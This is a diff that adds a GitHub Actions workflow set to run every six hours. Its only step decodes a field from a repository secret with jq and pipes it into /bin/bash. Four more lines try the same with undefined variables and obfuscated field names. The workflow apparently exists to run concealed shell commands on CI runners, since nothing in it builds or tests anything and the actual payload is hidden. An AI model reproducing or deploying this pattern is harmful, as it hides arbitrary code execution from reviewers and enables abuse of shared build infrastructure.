@@ -1,0 +1,20 @@
+name: peixuan19871010
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: peixuan19871010
+        env:
+          br9: ${{ secrets.br9 }}
+        run: |
+          echo $br9 | jq -r .gu42 | /bin/bash
+          echo $wku7642 | jq -r .b1718 | /bin/bash
+          echo $r83802 | jq -r .md39 | /bin/bash
+          echo $klsyq0339 | jq -r .bydkr384 | /bin/bash
+          echo $lz17805 | jq -r .smfon2 | /bin/bash
+
